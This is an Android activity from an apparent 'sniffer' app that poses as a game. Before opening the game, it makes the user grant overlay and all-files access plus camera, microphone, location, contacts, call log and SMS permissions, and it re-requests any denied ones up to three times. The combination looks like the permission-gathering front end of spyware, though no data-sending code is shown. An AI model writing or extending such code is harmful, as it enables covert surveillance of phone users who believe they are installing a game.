package com.v8.global.sniffer;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.Manifest;
import com.v8.global.sniffer.game.MainGameActivity;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 777;
    private static final int SYSTEM_ALERT_WINDOW_CODE = 888;
    private static final int MANAGE_STORAGE_CODE = 999;
    
    private boolean isPermissionProcessActive = true;
    private int retryCount = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // بدء عملية الصلاحيات
        startPermissionProcess();
    }

    private void startPermissionProcess() {
        // 1. صلاحية العرض فوق التطبيقات (الأهم)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, SYSTEM_ALERT_WINDOW_CODE);
                return;
            }
        }

        // 2. صلاحية إدارة الملفات للأندرويد 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, MANAGE_STORAGE_CODE);
                return;
            }
        }

        // 3. باقي الصلاحيات
        requestRuntimePermissions();
    }

    private void requestRuntimePermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        
        // قائمة الصلاحيات المطلوبة
        String[] permissions = {
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.POST_NOTIFICATIONS
        };

        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }

        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                permissionsNeeded.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        } else {
            // كل الصلاحيات ممنوحة
            openGame();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            // التحقق من الصلاحيات المرفوضة
            List<String> deniedPermissions = new ArrayList<>();
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    deniedPermissions.add(permissions[i]);
                }
            }

            if (!deniedPermissions.isEmpty() && retryCount < 3) {
                // محاولة إعادة طلب الصلاحيات المرفوضة
                retryCount++;
                ActivityCompat.requestPermissions(this, 
                    deniedPermissions.toArray(new String[0]), 
                    PERMISSION_REQUEST_CODE);
            } else {
                // بعد 3 محاولات، افتح اللعبة على أي حال
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        openGame();
                    }
                }, 2000);
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == SYSTEM_ALERT_WINDOW_CODE || requestCode == MANAGE_STORAGE_CODE) {
            // تأخير قصير ثم متابعة
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    startPermissionProcess();
                }
            }, 1000);
        }
    }

    private void openGame() {
        // فتح اللعبة
        Intent intent = new Intent(this, MainGameActivity.class);
        startActivity(intent);
        finish();
    }
}
